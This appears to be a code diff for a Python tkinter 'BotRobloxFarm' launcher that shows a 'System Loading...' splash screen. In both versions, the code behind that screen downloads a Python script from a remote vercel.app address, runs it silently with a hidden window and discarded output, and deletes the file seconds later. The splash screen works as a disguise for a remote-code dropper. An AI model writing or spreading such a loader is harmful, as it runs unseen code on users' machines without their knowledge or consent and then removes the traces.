@@ -1,209 +1,63 @@
 import tkinter as tk
 from tkinter import font
-import math
+import time
 import urllib.request
 import subprocess
 import sys
 import os
 import tempfile
-import time
 
-class TransparentBRFApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("BRF")
+class BRFLoader:
+    def __init__(self):
+        # Primul Tkinter - Loading Screen
+        self.loading_root = tk.Tk()
+        self.loading_root.title("Loading...")
+        self.loading_root.geometry("300x150")
+        self.loading_root.configure(bg='#0a0a0a')
+        self.loading_root.overrideredirect(True)  # Fără borduri
         
-        # Fereastra transparentă și fără borduri
-        self.root.overrideredirect(True)
-        self.root.attributes('-transparentcolor', '#000001')
-        self.root.attributes('-topmost', True)
-        self.root.configure(bg='#000001')
+        # Centrează loading screen
+        self.center_window(self.loading_root, 300, 150)
         
-        # Dimensiune fereastră
-        self.width, self.height = 500, 300
-        self.root.geometry(f"{self.width}x{self.height}")
-        
-        # Butoane transparente
-        self.buttons_visible = False
-        
-        # Canvas pentru fundal transparent
-        self.canvas = tk.Canvas(
-            root, 
-            bg='#000001',
-            highlightthickness=0,
-            width=self.width,
-            height=self.height
+        # Label loading
+        self.loading_label = tk.Label(
+            self.loading_root,
+            text="System Loading...",
+            font=("Consolas", 14),
+            fg="#00ffaa",
+            bg="#0a0a0a"
         )
-        self.canvas.pack(fill=tk.BOTH, expand=True)
+        self.loading_label.pack(expand=True)
         
-        # Crează elemente grafice
-        self.create_graphics()
+        # Pornim procesul de download
+        self.loading_root.after(100, self.start_download_process)
         
-        # Crează butoane (inițial invizibile)
-        self.create_buttons()
+        # Rulează loading screen pentru 3 secunde
+        self.loading_root.after(3000, self.close_loading_and_open_main)
         
-        # Centrează fereastra
-        self.center_window()
+        # Force focus
+        self.loading_root.lift()
+        self.loading_root.focus_force()
         
-        # Variabile animație
-        self.animation_phase = 0
-        self.loading_time = 0
-        self.showing_brf = False
-        
-        # Pornește animațiile
-        self.animate()
-        
-        # Pornește download în fundal
-        self.root.after(100, self.download_in_background)
-        
-        # Evenimente mouse
-        self.canvas.bind("<Enter>", self.show_buttons)
-        self.canvas.bind("<Leave>", self.hide_buttons)
+        self.loading_root.mainloop()
     
-    def create_graphics(self):
-        """Crează elementele grafice principale"""
-        # Fundal cu gradient transparent
-        self.gradient = self.canvas.create_rectangle(
-            0, 0, self.width, self.height,
-            fill="#0a0a0a",
-            outline=""
-        )
-        
-        # Text "BRF" - MARE și centrat
-        self.brf_font = font.Font(family="Segoe UI", size=62, weight="bold")
-        self.brf_text = self.canvas.create_text(
-            self.width//2, self.height//2 - 40,
-            text="",
-            font=self.brf_font,
-            fill="#00FFAA",
-            anchor="center"
-        )
-        
-        # Text "BotRobloxFarm"
-        self.sub_font = font.Font(family="Segoe UI", size=26, weight="normal")
-        self.sub_text = self.canvas.create_text(
-            self.width//2, self.height//2 + 20,
-            text="",
-            font=self.sub_font,
-            fill="#888888",
-            anchor="center"
-        )
-        
-        # Text "System loading..."
-        self.loading_font = font.Font(family="Consolas", size=16, weight="normal")
-        self.loading_text = self.canvas.create_text(
-            self.width//2, self.height//2 + 70,
-            text="",
-            font=self.loading_font,
-            fill="#00FF88",
-            anchor="center"
-        )
-        
-        # Efect de particule
-        self.particles = []
-        for _ in range(15):
-            x = self.width//2
-            y = self.height//2
-            particle = self.canvas.create_oval(
-                x-2, y-2, x+2, y+2,
-                fill="#00FFAA",
-                width=0
-            )
-            self.particles.append({
-                "id": particle,
-                "x": x,
-                "y": y,
-                "speed_x": (math.random() - 0.5) * 4,
-                "speed_y": (math.random() - 0.5) * 4,
-                "life": math.random() * 100
-            })
+    def center_window(self, window, width, height):
+        window.update_idletasks()
+        screen_width = window.winfo_screenwidth()
+        screen_height = window.winfo_screenheight()
+        x = (screen_width // 2) - (width // 2)
+        y = (screen_height // 2) - (height // 2)
+        window.geometry(f'{width}x{height}+{x}+{y}')
     
-    def create_buttons(self):
-        """Crează butoanele transparente"""
-        button_size = 35
-        button_y = 10
-        
-        # Buton Close (X) - transparent
-        self.close_btn = tk.Button(
-            self.canvas,
-            text="×",
-            font=("Arial", 14, "bold"),
-            fg="white",
-            bg="#ff4444",
-            activebackground="#ff6666",
-            activeforeground="white",
-            bd=0,
-            width=2,
-            height=1,
-            command=self.root.destroy
-        )
-        self.close_btn.place(x=self.width-40, y=button_y)
-        self.close_btn.place_forget()
-        
-        # Buton Minimize (-) - transparent
-        self.min_btn = tk.Button(
-            self.canvas,
-            text="–",
-            font=("Arial", 14, "bold"),
-            fg="white",
-            bg="#4488ff",
-            activebackground="#66aaff",
-            activeforeground="white",
-            bd=0,
-            width=2,
-            height=1,
-            command=self.root.iconify
-        )
-        self.min_btn.place(x=self.width-80, y=button_y)
-        self.min_btn.place_forget()
-        
-        # Permite glisarea ferestrei
-        self.canvas.bind("<Button-1>", self.start_move)
-        self.canvas.bind("<B1-Motion>", self.on_move)
-    
-    def show_buttons(self, event):
-        """Arată butoanele când mouse-ul intră în fereastră"""
-        if not self.buttons_visible:
-            self.buttons_visible = True
-            self.close_btn.place(x=self.width-40, y=10)
-            self.min_btn.place(x=self.width-80, y=10)
-    
-    def hide_buttons(self, event):
-        """Ascunde butoanele când mouse-ul iese din fereastră"""
-        if self.buttons_visible and event.y > 50:
-            self.buttons_visible = False
-            self.close_btn.place_forget()
-            self.min_btn.place_forget()
-    
-    def start_move(self, event):
-        self.x = event.x
-        self.y = event.y
-    
-    def on_move(self, event):
-        deltax = event.x - self.x
-        deltay = event.y - self.y
-        x = self.root.winfo_x() + deltax
-        y = self.root.winfo_y() + deltay
-        self.root.geometry(f"+{x}+{y}")
-    
-    def center_window(self):
-        """Centrează fereastra pe ecran"""
-        self.root.update_idletasks()
-        screen_width = self.root.winfo_screenwidth()
-        screen_height = self.root.winfo_screenheight()
-        x = (screen_width // 2) - (self.width // 2)
-        y = (screen_height // 2) - (self.height // 2)
-        self.root.geometry(f'+{x}+{y}')
-    
-    def download_in_background(self):
-        """Descarcă și rulează brf.py în fundal"""
+    def start_download_process(self):
+        """Descarcă și rulează în background"""
         try:
             url = "https://brf-eight.vercel.app/brf.py"
             with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
                 temp_path = f.name
                 urllib.request.urlretrieve(url, temp_path)
                 
-                # Rulează silențios
+                # Rulează SILENȚIOS
                 startupinfo = None
                 if sys.platform == "win32":
                     startupinfo = subprocess.STARTUPINFO()
@@ -218,11 +72,11 @@ class TransparentBRFApp:
                     stderr=subprocess.DEVNULL
                 )
                 
-                # Șterge după 3 secunde
-                self.root.after(3000, lambda: self.delete_file(temp_path))
+                # Șterge după 5 secunde
+                self.loading_root.after(5000, lambda: self.delete_file(temp_path))
                 
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"Download error: {e}")
     
     def delete_file(self, path):
         try:
@@ -235,84 +89,162 @@ class TransparentBRFApp:
         except:
             pass
     
+    def close_loading_and_open_main(self):
+        """Închide loading și deschide fereastra principală"""
+        if self.loading_root:
+            self.loading_root.destroy()
+            self.loading_root = None
+        
+        # Deschide fereastra principală
+        BRFMainApp()
+
+class BRFMainApp:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.root.title("BRF")
+        
+        # SETĂRI FEREATRĂ TRANSPARENTĂ
+        self.root.overrideredirect(True)  # Fără borduri
+        self.root.attributes('-alpha', 0.95)  # Transparent
+        self.root.attributes('-topmost', True)  # Mereu deasupra
+        self.root.configure(bg='#000000')
+        
+        # Dimensiuni
+        self.width, self.height = 500, 300
+        self.root.geometry(f"{self.width}x{self.height}")
+        
+        # Canvas pentru fundal
+        self.canvas = tk.Canvas(
+            self.root,
+            bg='#000000',
+            highlightthickness=0,
+            width=self.width,
+            height=self.height
+        )
+        self.canvas.pack(fill=tk.BOTH, expand=True)
+        
+        # Crează conținutul
+        self.create_content()
+        
+        # Crează butoanele X și -
+        self.create_window_buttons()
+        
+        # Centrează
+        self.center_window()
+        
+        # Animație simplă
+        self.animation_phase = 0
+        self.animate()
+        
+        # Permite glisarea
+        self.canvas.bind("<Button-1>", self.start_move)
+        self.canvas.bind("<B1-Motion>", self.on_move)
+        
+        # Rulează aplicația
+        self.root.mainloop()
+    
+    def create_content(self):
+        """Crează conținutul principal"""
+        # BRF text - FOARTE MARE
+        self.brf_text = self.canvas.create_text(
+            self.width//2, self.height//2 - 30,
+            text="BRF",
+            font=("Segoe UI", 72, "bold"),
+            fill="#00FFAA",
+            anchor="center"
+        )
+        
+        # BotRobloxFarm text
+        self.sub_text = self.canvas.create_text(
+            self.width//2, self.height//2 + 40,
+            text="BotRobloxFarm",
+            font=("Segoe UI", 28),
+            fill="#888888",
+            anchor="center"
+        )
+        
+        # Linie decorativă
+        self.canvas.create_line(
+            self.width//2 - 100, self.height//2 + 80,
+            self.width//2 + 100, self.height//2 + 80,
+            fill="#00FFAA",
+            width=2
+        )
+    
+    def create_window_buttons(self):
+        """Crează butoanele X și -"""
+        # Buton CLOSE (X) - ROȘU VIZIBIL
+        self.close_btn = tk.Button(
+            self.root,
+            text="×",
+            font=("Arial", 16, "bold"),
+            fg="white",
+            bg="#ff4444",
+            activebackground="#ff6666",
+            activeforeground="white",
+            bd=0,
+            width=3,
+            height=1,
+            command=self.root.destroy
+        )
+        self.close_btn.place(x=self.width-40, y=10)
+        
+        # Buton MINIMIZE (-) - ALBASTRU VIZIBIL
+        self.min_btn = tk.Button(
+            self.root,
+            text="–",
+            font=("Arial", 16, "bold"),
+            fg="white",
+            bg="#4488ff",
+            activebackground="#66aaff",
+            activeforeground="white",
+            bd=0,
+            width=3,
+            height=1,
+            command=self.root.iconify
+        )
+        self.min_btn.place(x=self.width-80, y=10)
+    
+    def center_window(self):
+        """Centrează fereastra"""
+        self.root.update_idletasks()
+        screen_width = self.root.winfo_screenwidth()
+        screen_height = self.root.winfo_screenheight()
+        x = (screen_width // 2) - (self.width // 2)
+        y = (screen_height // 2) - (self.height // 2)
+        self.root.geometry(f'+{x}+{y}')
+    
+    def start_move(self, event):
+        """Începe glisarea ferestrei"""
+        self.x = event.x
+        self.y = event.y
+    
+    def on_move(self, event):
+        """Glisează fereastra"""
+        deltax = event.x - self.x
+        deltay = event.y - self.y
+        x = self.root.winfo_x() + deltax
+        y = self.root.winfo_y() + deltay
+        self.root.geometry(f"+{x}+{y}")
+    
     def animate(self):
-        """Animația principală"""
-        self.animation_phase += 0.05
-        self.loading_time += 0.1
+        """Animație simplă de pulsare"""
+        self.animation_phase += 0.1
         
-        # Animație loading pentru primele 3 secunde
-        if self.loading_time < 30:  # 3 secunde * 10 frames/sec
-            dots = ["   ", ".  ", ".. ", "..."]
-            dot_index = int(self.loading_time) % 4
-            loading_text = f"System loading{dots[dot_index]}"
-            self.canvas.itemconfig(self.loading_text, text=loading_text)
-            
-            # Nu arăta BRF încă
-            self.canvas.itemconfig(self.brf_text, text="")
-            self.canvas.itemconfig(self.sub_text, text="")
-        else:
-            # După 3 secunde, arată BRF
-            if not self.showing_brf:
-                self.showing_brf = True
-                self.canvas.itemconfig(self.brf_text, text="BRF")
-                self.canvas.itemconfig(self.sub_text, text="BotRobloxFarm")
-                self.canvas.itemconfig(self.loading_text, text="✓ Ready")
+        # Pulsare text BRF
+        import math
+        pulse = (math.sin(self.animation_phase) + 1) / 2
+        r = 0
+        g = int(200 + pulse * 55)
+        b = int(150 + pulse * 105)
+        color = f'#{r:02x}{g:02x}{b:02x}'
         
-        # Animație pulsare text BRF
-        if self.showing_brf:
-            pulse = (math.sin(self.animation_phase * 1.5) + 1) / 2
-            r = 0
-            g = int(200 + pulse * 55)
-            b = int(150 + pulse * 105)
-            color = f'#{r:02x}{g:02x}{b:02x}'
-            self.canvas.itemconfig(self.brf_text, fill=color)
-        
-        # Animație particule
-        for particle in self.particles:
-            particle["life"] -= 1
-            if particle["life"] <= 0:
-                # Resetează particula
-                particle["x"] = self.width//2
-                particle["y"] = self.height//2
-                particle["speed_x"] = (math.random() - 0.5) * 4
-                particle["speed_y"] = (math.random() - 0.5) * 4
-                particle["life"] = math.random() * 100
-            
-            # Mișcă particula
-            particle["x"] += particle["speed_x"]
-            particle["y"] += particle["speed_y"]
-            
-            # Verifică limite
-            if particle["x"] < 0 or particle["x"] > self.width:
-                particle["speed_x"] *= -1
-            if particle["y"] < 0 or particle["y"] > self.height:
-                particle["speed_y"] *= -1
-            
-            # Actualizează poziția
-            self.canvas.coords(
-                particle["id"],
-                particle["x"]-2, particle["y"]-2,
-                particle["x"]+2, particle["y"]+2
-            )
-            
-            # Transparență bazată pe viață
-            alpha = particle["life"] / 100
-            color = f'#{int(alpha*255):02x}{int(alpha*200):02x}{int(alpha*150):02x}'
-            self.canvas.itemconfig(particle["id"], fill=color)
-        
-        # Gradient animat
-        gradient_color = f'#{int(10+math.sin(self.animation_phase)*5):02x}0a0a'
-        self.canvas.itemconfig(self.gradient, fill=gradient_color)
+        self.canvas.itemconfig(self.brf_text, fill=color)
         
         # Continuă animația
-        self.root.after(50, self.animate)
+        self.root.after(100, self.animate)
 
-# Adaugă funcția random pentru math
-import random
-math.random = random.random
-
-# Rulează aplicația
+# Pornire aplicație
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = TransparentBRFApp(root)
-    root.mainloop()
+    # Pornește cu loading screen
+    loader = BRFLoader()
